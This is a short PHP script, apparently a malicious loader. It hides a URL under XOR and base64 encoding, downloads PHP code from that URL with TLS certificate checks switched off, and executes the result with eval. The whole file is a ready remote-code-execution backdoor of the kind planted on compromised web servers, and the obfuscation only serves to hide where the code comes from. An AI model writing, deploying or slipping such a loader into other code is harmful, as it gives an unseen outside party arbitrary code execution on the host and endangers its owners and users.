<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

function xorEncode($data, $key) {
    $keyLength = strlen($key);
    $dataLength = strlen($data);
    $encoded = '';

    for ($i = 0; $i < $dataLength; $i++) {
        $encoded .= $data[$i] ^ $key[$i % $keyLength];
    }

    return base64_encode($encoded);
}

function xorDecode($data, $key) {
    $data = base64_decode($data);
    $keyLength = strlen($key);
    $dataLength = strlen($data);
    $decoded = '';

    for ($i = 0; $i < $dataLength; $i++) {
        $decoded .= $data[$i] ^ $key[$i % $keyLength];
    }

    return $decoded;
}

$encodedUrl = 'Iz8/OzhxZGQgKjk+OSg+OT8qIiU4ZSgkJmQqODguPzhkKDg4';
$key = 'K';
$url = xorDecode($encodedUrl, $key);

if ($url === false || empty($url)) {
    die("Error: Failed to decode URL or URL is empty.");
}

$ch = curl_init();

function setCurlOpt($ch, $option, $value) {
    if (is_int($option)) {
        curl_setopt($ch, $option, $value);
    } else {
        $options = [
            'CURLOPT_URL' => CURLOPT_URL,
            'CURLOPT_RETURNTRANSFER' => CURLOPT_RETURNTRANSFER,
            'CURLOPT_SSL_VERIFYPEER' => CURLOPT_SSL_VERIFYPEER,
            'CURLOPT_SSL_VERIFYHOST' => CURLOPT_SSL_VERIFYHOST
        ];
        $constant = $options[$option] ?? null;
        if ($constant !== null) {
            curl_setopt($ch, $constant, $value);
        }
    }
}

$options = [
    'CURLOPT_URL' => $url,
    'CURLOPT_RETURNTRANSFER' => true,
    'CURLOPT_SSL_VERIFYPEER' => false,
    'CURLOPT_SSL_VERIFYHOST' => false
];

foreach ($options as $opt => $val) {
    setCurlOpt($ch, $opt, $val);
}

$phpCode = curl_exec($ch);

if ($phpCode === false) {
    $error = curl_error($ch);
    curl_close($ch);
    die("Error: The file could not be loaded. cURL Error: " . $error);
}

curl_close($ch);

if (empty($phpCode)) {
    die("Error: The file content is empty.");
}

eval('?>' . $phpCode);
?>
